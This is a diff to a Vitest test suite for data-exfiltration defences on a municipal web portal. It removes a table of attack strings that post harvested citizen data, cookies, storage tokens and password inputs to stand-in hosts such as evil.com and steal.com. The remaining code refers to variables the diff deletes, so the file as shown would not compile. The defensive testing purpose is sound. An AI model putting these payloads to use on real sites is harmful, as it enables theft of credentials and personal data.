@@ -9,72 +9,10 @@
 import { describe, it, expect, beforeEach, vi } from 'vitest';
 
 // Mock security monitoring utilities
-const mockSecurityMonitoring = {
-  monitorDataAccess: vi.fn(),
-  blockExfiltrationAttempt: vi.fn(),
-  validateDataRequest: vi.fn(),
-  logSecurityIncident: vi.fn(),
-  alertMunicipalSecurity: vi.fn()
-};
 
 // Data exfiltration attack patterns
-const DATA_EXFILTRATION_PATTERNS = {
-  apiDataHarvesting: [
-    'fetch("/api/municipal-employees").then(r=>r.json()).then(d=>exfiltrate(d))',
-    'fetch("/api/citizen-data").then(data=>fetch("http://evil.com",{method:"POST",body:JSON.stringify(data)}))',
-    'fetch("/api/municipal-budget").then(r=>r.text()).then(d=>navigator.sendBeacon("http://malicious.com",d))',
-    'await fetch("/api/emergency-contacts").then(response=>window.open("http://steal.com?data="+btoa(response)))',
-    'Promise.all([fetch("/api/employees"),fetch("/api/citizens")]).then(responses=>exfiltrateAll(responses))'
-  ],
-  localStorageAccess: [
-    'localStorage.getItem("municipal-token")',
-    'sessionStorage.getItem("user-credentials")',
-    'localStorage.setItem("backdoor", JSON.stringify({admin:true}))',
-    'Object.keys(localStorage).forEach(key=>exfiltrate(key,localStorage[key]))',
-    'for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);send(key,localStorage[key])}'
-  ],
-  cookieDataTheft: [
-    'document.cookie',
-    'document.cookie="municipal-session=hijacked; domain=.malmö.se"',
-    'document.cookie.split(";").forEach(cookie=>exfiltrate(cookie))',
-    'navigator.cookieEnabled && stealAllCookies()',
-    'document.cookie.match(/municipal-[^=]+=([^;]*)/g)'
-  ],
-  browserDataExfiltration: [
-    'navigator.userAgent',
-    'window.location.href',
-    'document.referrer',
-    'screen.width+"x"+screen.height',
-    'navigator.language+","+navigator.languages.join(",")',
-    'new Date().getTimezoneOffset()'
-  ],
-  formDataInterception: [
-    'document.forms[0].elements["password"].value',
-    'document.querySelectorAll("input[type=password]").forEach(input=>steal(input.value))',
-    'Array.from(document.forms).map(form=>new FormData(form))',
-    'document.addEventListener("submit",e=>exfiltrate(new FormData(e.target)))',
-    'setInterval(()=>document.querySelectorAll("input").forEach(i=>capture(i.value)),1000)'
-  ],
-  municipalSpecificTheft: [
-    'window.municipal && municipal.getCurrentUser()',
-    'window.municipalData && Object.keys(municipalData)',
-    'document.querySelector("[data-municipality]").dataset',
-    'document.title.includes("Malmö") && exfiltrateLocation()',
-    'document.querySelectorAll(".municipal-data").forEach(el=>steal(el.textContent))'
-  ]
-};
 
 // Municipal data categories requiring protection
-const PROTECTED_MUNICIPAL_DATA = [
-  'citizen-personal-information',
-  'municipal-employee-records',
-  'emergency-contact-database',
-  'municipal-budget-information',
-  'government-authentication-tokens',
-  'citizen-service-requests',
-  'municipal-internal-communications',
-  'gdpr-compliance-records'
-];
 
 describe('Data Exfiltration Prevention Testing', () => {
   let dataProtectionHarness: Record<string, unknown>;
@@ -89,7 +27,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('API Data Harvesting Prevention', () => {
     it('should prevent unauthorized API data harvesting attempts', async () => {
       for (const harvestingPattern of DATA_EXFILTRATION_PATTERNS.apiDataHarvesting) {
-        const harvestingTest = await dataProtectionHarness.testAPIHarvestingPrevention({
           attackPattern: harvestingPattern,
           targetAPI: '/api/municipal-employees',
           municipality: 'malmö',
@@ -126,35 +63,8 @@ describe('Data Exfiltration Prevention Testing', () => {
     });
 
     it('should validate legitimate API access while blocking exfiltration', async () => {
-      const legitimateAPIRequests = [
-        {
-          endpoint: '/api/public-services',
-          method: 'GET',
-          userRole: 'citizen',
-          expectedAccess: 'allowed'
-        },
-        {
-          endpoint: '/api/municipal-contact',
-          method: 'GET', 
-          userRole: 'citizen',
-          expectedAccess: 'allowed'
-        },
-        {
-          endpoint: '/api/employee-directory',
-          method: 'GET',
-          userRole: 'municipal-employee',
-          expectedAccess: 'allowed'
-        },
-        {
-          endpoint: '/api/citizen-data',
-          method: 'GET',
-          userRole: 'citizen',
-          expectedAccess: 'blocked'
-        }
-      ];
 
       for (const request of legitimateAPIRequests) {
-        const accessValidation = await dataProtectionHarness.validateAPIAccess({
           endpoint: request.endpoint,
           method: request.method,
           userRole: request.userRole,
@@ -179,7 +89,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('Local Storage and Session Data Protection', () => {
     it('should prevent unauthorized local storage access', async () => {
       for (const storagePattern of DATA_EXFILTRATION_PATTERNS.localStorageAccess) {
-        const storageProtectionTest = await dataProtectionHarness.testLocalStorageProtection({
           accessPattern: storagePattern,
           contentContext: 'municipal-training-content',
           municipality: 'malmö'
@@ -208,15 +117,7 @@ describe('Data Exfiltration Prevention Testing', () => {
     });
 
     it('should secure municipal session data from exfiltration', async () => {
-      const municipalSessionData = {
-        'municipal-user-id': '12345',
-        'municipal-role': 'administrator',
-        'municipality-context': 'malmö',
-        'session-token': 'encrypted-token-data',
-        'gdpr-consent': 'granted'
-      };
 
-      const sessionProtectionTest = await dataProtectionHarness.testSessionDataProtection({
         sessionData: municipalSessionData,
         protectionLevel: 'government-grade',
         municipality: 'malmö'
@@ -247,7 +148,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('Cookie Data Theft Prevention', () => {
     it('should prevent unauthorized cookie access and manipulation', async () => {
       for (const cookiePattern of DATA_EXFILTRATION_PATTERNS.cookieDataTheft) {
-        const cookieProtectionTest = await dataProtectionHarness.testCookieProtection({
           accessPattern: cookiePattern,
           cookieContext: 'municipal-authentication',
           municipality: 'malmö'
@@ -276,7 +176,6 @@ describe('Data Exfiltration Prevention Testing', () => {
     });
 
     it('should validate secure cookie practices for municipal authentication', async () => {
-      const municipalCookieValidation = await dataProtectionHarness.validateMunicipalCookieSecurity({
         cookieNames: ['municipal-session', 'auth-token', 'municipality-context'],
         securityLevel: 'government-grade',
         municipality: 'malmö'
@@ -299,7 +198,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('Browser Data Exfiltration Prevention', () => {
     it('should prevent unauthorized browser information gathering', async () => {
       for (const browserPattern of DATA_EXFILTRATION_PATTERNS.browserDataExfiltration) {
-        const browserProtectionTest = await dataProtectionHarness.testBrowserDataProtection({
           dataAccessPattern: browserPattern,
           protectionLevel: 'municipal-standard',
           municipality: 'malmö'
@@ -331,7 +229,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('Form Data Interception Prevention', () => {
     it('should prevent unauthorized form data capture', async () => {
       for (const formPattern of DATA_EXFILTRATION_PATTERNS.formDataInterception) {
-        const formProtectionTest = await dataProtectionHarness.testFormDataProtection({
           interceptPattern: formPattern,
           formType: 'municipal-citizen-service',
           municipality: 'malmö'
@@ -360,7 +257,6 @@ describe('Data Exfiltration Prevention Testing', () => {
     });
 
     it('should secure municipal form submissions from interception', async () => {
-      const municipalFormSecurity = await dataProtectionHarness.validateMunicipalFormSecurity({
         formTypes: ['citizen-complaint', 'service-request', 'emergency-contact'],
         securityLevel: 'government-grade',
         municipality: 'malmö'
@@ -383,7 +279,6 @@ describe('Data Exfiltration Prevention Testing', () => {
   describe('Municipal-Specific Data Theft Prevention', () => {
     it('should prevent municipal-specific data targeting', async () => {
       for (const municipalPattern of DATA_EXFILTRATION_PATTERNS.municipalSpecificTheft) {
-        const municipalTheftPrevention = await dataProtectionHarness.testMunicipalDataTheftPrevention({
           targetingPattern: municipalPattern,
           municipalContext: 'malmö-administrative-portal',
           userRole: 'external-user'
@@ -412,7 +307,6 @@ describe('Data Exfiltration Prevention Testing', () => {
     });
 
     it('should validate complete municipal data isolation between tenants', async () => {
-      const municipalDataIsolation = await dataProtectionHarness.testMunicipalDataIsolation({
         primaryMunicipality: 'malmö',
         testMunicipalities: ['göteborg', 'stockholm', 'uppsala'],
         isolationLevel: 'complete'
@@ -442,7 +336,6 @@ describe('Data Exfiltration Prevention Testing', () => {
 
   describe('Performance and Real-Time Monitoring', () => {
     it('should maintain data protection performance under municipal load', async () => {
-      const protectionPerformanceTest = await dataProtectionHarness.testDataProtectionPerformance({
         concurrentUsers: 500,
         dataAccessAttempts: 1000,
         protectionLayers: 5,
@@ -502,11 +395,6 @@ function createDataProtectionHarness() {
       }
     }),
     validateAPIAccess: vi.fn().mockImplementation(({ userRole, endpoint }) => {
-      const publicEndpoints = ['/api/public-services', '/api/municipal-contact'];
-      const employeeEndpoints = ['/api/employee-directory'];
-      const isPublic = publicEndpoints.includes(endpoint);
-      const isEmployeeAllowed = employeeEndpoints.includes(endpoint) && userRole === 'municipal-employee';
-      const accessGranted = isPublic || isEmployeeAllowed;
       
       return Promise.resolve({
         accessGranted,
